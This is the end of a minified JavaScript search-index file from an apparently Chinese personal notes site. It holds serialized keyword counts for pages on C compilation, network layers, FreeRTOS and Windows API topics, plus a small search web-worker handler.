"1\":{\"9\":1}}],[\"n\",{\"1\":{\"8\":2,\"9\":6}}],[\"null\",{\"1\":{\"8\":5,\"9\":3}}],[\"ncode\",{\"1\":{\"8\":3}}],[\"network\",{\"1\":{\"5\":1}}],[\"nixman\",{\"1\":{\"1\":1}}],[\"网络层\",{\"1\":{\"5\":1}}],[\"802\",{\"1\":{\"5\":1}}],[\"如ieee\",{\"1\":{\"5\":1}}],[\"定义了无线数据链路层的帧格式和协议\",{\"1\":{\"5\":1}}],[\"定义了数据链路层的帧格式和mac地址的使用规则\",{\"1\":{\"5\":1}}],[\"无线局域网技术\",{\"1\":{\"5\":1}}],[\"无线信号等\",{\"1\":{\"5\":1}}],[\"将ppp封装在以太网帧中\",{\"1\":{\"5\":1}}],[\"一种简单的数据链路层协议\",{\"1\":{\"5\":1}}],[\"一种数据链路层协议\",{\"1\":{\"5\":1}}],[\"hook\",{\"1\":{\"8\":4}}],[\"hhook\",{\"1\":{\"8\":1}}],[\"h>\",{\"1\":{\"8\":2,\"9\":4}}],[\"high\",{\"1\":{\"5\":1}}],[\"hdlc\",{\"1\":{\"5\":1}}],[\"http\",{\"1\":{\"4\":1}}],[\"https\",{\"1\":{\"1\":1}}],[\"target\",{\"1\":{\"9\":1}}],[\"translatemessage\",{\"1\":{\"8\":1}}],[\"transport\",{\"1\":{\"5\":1}}],[\"txt\",{\"1\":{\"8\":1,\"9\":1}}],[\"to\",{\"1\":{\"5\":2,\"8\":1}}],[\"text\",{\"1\":{\"3\":7}}],[\"是最常用的局域网技术\",{\"1\":{\"5\":1}}],[\"以太网\",{\"1\":{\"5\":1}}],[\"例如http协议\",{\"1\":{\"5\":1}}],[\"例如加密协议和压缩协议\",{\"1\":{\"5\":1}}],[\"例如会话控制协议\",{\"1\":{\"5\":1}}],[\"例如tcp协议和udp协议\",{\"1\":{\"5\":1}}],[\"例如ip协议\",{\"1\":{\"5\":1}}],[\"例如拨号连接或串行链路\",{\"1\":{\"5\":1}}],[\"例如以太网协议\",{\"1\":{\"5\":1}}],[\"例如电缆\",{\"1\":{\"5\":1}}],[\"确保可靠的数据传输\",{\"1\":{\"5\":1}}],[\"数据链路层\",{\"1\":{\"5\":1}}],[\"光纤\",{\"1\":{\"5\":1}}],[\"负责传输数据的物理媒介和比特流\",{\"1\":{\"5\":1}}],[\"pcurraddresses\",{\"1\":{\"9\":7}}],[\"paddresses\",{\"1\":{\"9\":7}}],[\"pip\",{\"1\":{\"9\":2}}],[\"pkeystruct\",{\"1\":{\"8\":2}}],[\"prefix\",{\"1\":{\"9\":2}}],[\"presentation\",{\"1\":{\"5\":1}}],[\"printf\",{\"1\":{\"8\":1,\"9\":4}}],[\"protocol\",{\"1\":{\"5\":3}}],[\"point\",{\"1\":{\"5\":4}}],[\"posix\",{\"1\":{\"1\":1}}],[\"pppoe\",{\"1\":{\"5\":1}}],[\"ppp\",{\"1\":{\"5\":1}}],[\"physical\",{\"1\":{\"5\":1}}],[\"物理层\",{\"1\":{\"5\":1}}],[\"常用的网络协议\",{\"1\":{\"5\":1}}],[\"常量\",{\"1\":{\"4\":1}}],[\"宏定义\",{\"1\":{\"4\":1}}],[\"宏扩展\",{\"1\":{\"3\":1}}],[\"==\",{\"1\":{\"8\":2,\"9\":2}}],[\"===================\",{\"1\":{\"6\":1}}],[\"==================\",{\"1\":{\"6\":1}}],[\"=\",{\"1\":{\"4\":1,\"8\":6,\"9\":6}}],[\"xxx\",{\"1\":{\"4\":1,\"8\":1}}],[\"xxxxx\",{\"1\":{\"4\":1}}],[\"x86\",{\"1\":{\"1\":1,\"9\":1}}],[\"ll\",{\"1\":{\"8\":1}}],[\"lparam\",{\"1\":{\"8\":4}}],[\"lresult\",{\"1\":{\"8\":1}}],[\"lowlevelkeyboardproc\",{\"1\":{\"8\":2}}],[\"loadlibrary\",{\"1\":{\"6\":2}}],[\"long\",{\"1\":{\"4\":1}}],[\"level\",{\"1\":{\"5\":1}}],[\"line\",{\"1\":{\"5\":1}}],[\"link\",{\"1\":{\"5\":2,\"9\":1}}],[\"libiphlpapi\",{\"1\":{\"9\":1}}],[\"libraries\",{\"1\":{\"9\":1}}],[\"lib\",{\"1\":{\"3\":1,\"9\":1}}],[\"layer\",{\"1\":{\"5\":7}}],[\"ld\",{\"1\":{\"3\":1,\"8\":1}}],[\"malloc\",{\"1\":{\"9\":1}}],[\"main\",{\"1\":{\"8\":1,\"9\":1}}],[\"msg\",{\"1\":{\"8\":5}}],[\"mybin\",{\"1\":{\"3\":1}}],[\"mingw32\",{\"1\":{\"9\":1}}],[\"mingw64\",{\"1\":{\"1\":1,\"9\":1}}],[\"mingw\",{\"1\":{\"1\":1}}],[\"操作系统中为\",{\"1\":{\"3\":1}}],[\"在以太网上运行的一种协议\",{\"1\":{\"5\":1}}],[\"在linux\",{\"1\":{\"3\":1}}],[\"在微控制器程序中\",{\"1\":{\"3\":1}}],[\"其扩展名为\",{\"1\":{\"3\":1}}],[\"其中包含机器语言中的函数定义\",{\"1\":{\"3\":1}}],[\"链接过程会生成一个可执行文件\",{\"1\":{\"3\":1}}],[\"链接是将库文件包含在我们的程序中的过程\",{\"1\":{\"3\":1}}],[\"这个时候我们想怎么操作程序内存数据都没问题\",{\"1\":{\"6\":1}}],[\"这个\",{\"1\":{\"6\":1}}],[\"这个函数是用来引入外部dll的\",{\"1\":{\"6\":1}}],[\"这些文件的扩展名为\",{\"1\":{\"3\":1}}],[\"这一步由预处理器完成\",{\"1\":{\"3\":1}}],[\"库文件是一些预定义的文件\",{\"1\":{\"3\":1}}],[\"连接器\",{\"1\":{\"3\":1}}],[\"连接\",{\"1\":{\"3\":1,\"5\":1}}],[\"4\",{\"1\":{\"3\":1}}],[\"十六进制代码\",{\"1\":{\"3\":1}}],[\"十六进制形式\",{\"1\":{\"3\":1}}],[\"称为目标代码\",{\"1\":{\"3\":1}}],[\"并将其转换为特定于计算机类型\",{\"1\":{\"3\":1}}],[\"并通过终端窗口告诉我们源代码中存在的任何语法错误或警告\",{\"1\":{\"3\":1}}],[\"它从汇编文件中获取基本指令\",{\"1\":{\"3\":1}}],[\"它将汇编代码转换为机器代码\",{\"1\":{\"3\":1}}],[\"二进制\",{\"1\":{\"3\":1}}],[\"转换为机器可理解的代码\",{\"1\":{\"3\":1}}],[\"文件\",{\"1\":{\"3\":1}}],[\"文件包含\",{\"1\":{\"3\":1}}],[\"使用汇编程序将程序集级代码\",{\"1\":{\"3\":1}}],[\"汇编程序是一个预先编写的程序\",{\"1\":{\"3\":1}}],[\"汇编\",{\"1\":{\"3\":1}}],[\"汇编代码是一种简单的英文语言\",{\"1\":{\"3\":1}}],[\"3\",{\"1\":{\"3\":1}}],[\"语法分析\",{\"1\":{\"3\":1}}],[\"整个程序代码由编译器软件一次性解析\",{\"1\":{\"3\":1}}],[\"ss\",{\"1\":{\"7\":1}}],[\"sssssss\",{\"1\":{\"7\":1}}],[\"smtp协议等\",{\"1\":{\"5\":1}}],[\"setwindowshookex\",{\"1\":{\"8\":1}}],[\"session\",{\"1\":{\"5\":1}}],[\"serial\",{\"1\":{\"5\":1}}],[\"seh\",{\"1\":{\"1\":1}}],[\"slip\",{\"1\":{\"5\":1}}],[\"s\",{\"1\":{\"3\":5}}],[\"的函数肯定也是一样的\",{\"1\":{\"6\":1}}],[\"的二进制\",{\"1\":{\"3\":1}}],[\"的汇编文件\",{\"1\":{\"3\":1}}],[\"的临时文件\",{\"1\":{\"3\":1}}],[\"低级代码\",{\"1\":{\"3\":1}}],[\"临时文件转换为具有汇编级指令\",{\"1\":{\"3\":1}}],[\"onlly\",{\"1\":{\"6\":1}}],[\"overflow\",{\"1\":{\"9\":1}}],[\"over\",{\"1\":{\"5\":1}}],[\"outbuflen\",{\"1\":{\"9\":4}}],[\"out\",{\"1\":{\"3\":1}}],[\"o\",{\"1\":{\"3\":6}}],[\"ex\",{\"0\":{\"13\":1}}],[\"exe\",{\"1\":{\"3\":2}}],[\"error\",{\"1\":{\"9\":2}}],[\"engine\",{\"1\":{\"6\":1}}],[\"ethernet\",{\"1\":{\"5\":2}}],[\"e\",{\"1\":{\"3\":1}}],[\"删除所有的注释\",{\"1\":{\"3\":1}}],[\"id\",{\"1\":{\"9\":1}}],[\"i++\",{\"1\":{\"9\":1}}],[\"ip\",{\"1\":{\"9\":1}}],[\"if\",{\"1\":{\"8\":3,\"9\":3}}],[\"install\",{\"1\":{\"8\":1}}],[\"int\",{\"1\":{\"8\":2,\"9\":2}}],[\"internet\",{\"1\":{\"5\":1}}],[\"include\",{\"1\":{\"8\":2,\"9\":6}}],[\"i\",{\"1\":{\"3\":4,\"9\":1}}],[\"与处理结束后会产生一个后缀为\",{\"1\":{\"3\":1}}],[\"译过程的第一步预就是预处理\",{\"1\":{\"3\":1}}],[\"预处理器主要完成以下任务\",{\"1\":{\"3\":1}}],[\"预处理\",{\"1\":{\"3\":1}}],[\"11系列标准\",{\"1\":{\"5\":1}}],[\"111l\",{\"1\":{\"4\":1}}],[\"1\",{\"1\":{\"3\":1,\"8\":1,\"9\":1}}],[\"12\",{\"1\":{\"1\":1}}],[\"gaa\",{\"1\":{\"9\":2}}],[\"getadaptersaddresses\",{\"1\":{\"9\":2}}],[\"getmessage\",{\"1\":{\"8\":1}}],[\"g++\",{\"1\":{\"3\":4}}],[\"gcc\",{\"1\":{\"3\":1}}],[\"github\",{\"1\":{\"1\":1}}],[\"第十一章\",{\"1\":{\"2\":1}}],[\"第十章\",{\"1\":{\"2\":1}}],[\"第九章\",{\"1\":{\"2\":1}}],[\"第八章\",{\"1\":{\"2\":1}}],[\"第七章\",{\"1\":{\"2\":1}}],[\"第六章\",{\"1\":{\"2\":1}}],[\"第五章\",{\"1\":{\"2\":1}}],[\"第四章\",{\"1\":{\"2\":1}}],[\"第三章\",{\"1\":{\"2\":1}}],[\"第二章\",{\"1\":{\"2\":1}}],[\"第一章\",{\"1\":{\"2\":1}}],[\"free\",{\"1\":{\"9\":1}}],[\"freertos中断管理\",{\"1\":{\"2\":1}}],[\"freertos内存管理\",{\"1\":{\"2\":1}}],[\"freertos软件定时器\",{\"1\":{\"2\":1}}],[\"freertos任务通知\",{\"1\":{\"2\":1}}],[\"freertos任务管理\",{\"1\":{\"2\":1}}],[\"freertos事件组\",{\"1\":{\"2\":1}}],[\"freertos互斥量\",{\"1\":{\"2\":1}}],[\"freertos信号量\",{\"1\":{\"2\":1}}],[\"freertos消息队列\",{\"1\":{\"2\":1}}],[\"freertos创建任务\",{\"1\":{\"2\":1}}],[\"freertos移植到stm32\",{\"1\":{\"2\":1}}],[\"flag\",{\"1\":{\"9\":2}}],[\"failed\",{\"1\":{\"8\":1}}],[\"fclose\",{\"1\":{\"8\":1}}],[\"fprintf\",{\"1\":{\"8\":1}}],[\"fopen\",{\"1\":{\"8\":1}}],[\"ftp协议\",{\"1\":{\"5\":1}}],[\"fidelity\",{\"1\":{\"5\":1}}],[\"fi\",{\"1\":{\"5\":1}}],[\"file\",{\"1\":{\"1\":1,\"8\":5}}],[\"添加\",{\"1\":{\"1\":1}}],[\"+\",{\"1\":{\"1\":1}}],[\">next\",{\"1\":{\"9\":1}}],[\">adaptername\",{\"1\":{\"9\":1}}],[\">description\",{\"1\":{\"9\":1}}],[\">friendlyname\",{\"1\":{\"9\":1}}],[\">vkcode\",{\"1\":{\"8\":1}}],[\">=\",{\"1\":{\"8\":1}}],[\">\",{\"1\":{\"1\":1}}],[\">toolchains\",{\"1\":{\"1\":1}}],[\">build\",{\"1\":{\"1\":1}}],[\">setting\",{\"1\":{\"1\":1}}],[\"配置\",{\"1\":{\"1\":1}}],[\"配置到path\",{\"1\":{\"1\":1}}],[\"cmakelists\",{\"1\":{\"9\":1}}],[\"callnexthookex\",{\"1\":{\"8\":1}}],[\"callback\",{\"1\":{\"8\":1}}],[\"cheat\",{\"1\":{\"6\":1}}],[\"control\",{\"1\":{\"5\":1}}],[\"const\",{\"1\":{\"4\":1}}],[\"com\",{\"1\":{\"1\":1}}],[\"cpp\",{\"1\":{\"3\":1}}],[\"clion\",{\"1\":{\"1\":1}}],[\"c\",{\"0\":{\"10\":1},\"1\":{\"1\":1,\"3\":4,\"9\":1}}],[\"dispatchmessage\",{\"1\":{\"8\":1}}],[\"dword\",{\"1\":{\"8\":1}}],[\"debug\",{\"1\":{\"6\":1}}],[\"define\",{\"1\":{\"4\":1}}],[\"dll的基地址是固定的\",{\"1\":{\"6\":1}}],[\"dll里面\",{\"1\":{\"6\":1}}],[\"dll\",{\"1\":{\"6\":1}}],[\"data\",{\"1\":{\"5\":2}}],[\"d\",{\"1\":{\"1\":1,\"9\":2}}],[\"解压\",{\"1\":{\"1\":1}}],[\"7z\",{\"1\":{\"1\":1}}],[\"return\",{\"1\":{\"8\":3,\"9\":1}}],[\"rev1\",{\"1\":{\"1\":1}}],[\"release\",{\"1\":{\"1\":1}}],[\"releases\",{\"1\":{\"1\":1}}],[\"rt\",{\"1\":{\"1\":1}}],[\"0\",{\"1\":{\"1\":1,\"8\":6,\"9\":2}}],[\"2\",{\"1\":{\"1\":1,\"3\":1}}],[\"64\",{\"1\":{\"1\":1,\"9\":1}}],[\"buffer\",{\"1\":{\"9\":1}}],[\"builds\",{\"1\":{\"1\":1}}],[\"binaries\",{\"1\":{\"1\":1}}],[\"下载\",{\"1\":{\"1\":1}}],[\"鱼头笔记\",{\"0\":{\"0\":1},\"1\":{\"0\":1}}]],\"serializationVersion\":2}}")).map(([e,t])=>[e,zt(t,{fields:["h","t","c"],storeFields:["h","t","c"]})]));self.onmessage=({data:{type:e="all",query:t,locale:s,options:n}})=>{e==="suggest"?self.postMessage(st(t,v[s],n)):e==="search"?self.postMessage(et(t,v[s],n)):self.postMessage({suggestions:st(t,v[s],n),results:et(t,v[s],n)})};
//# sourceMappingURL=index.js.map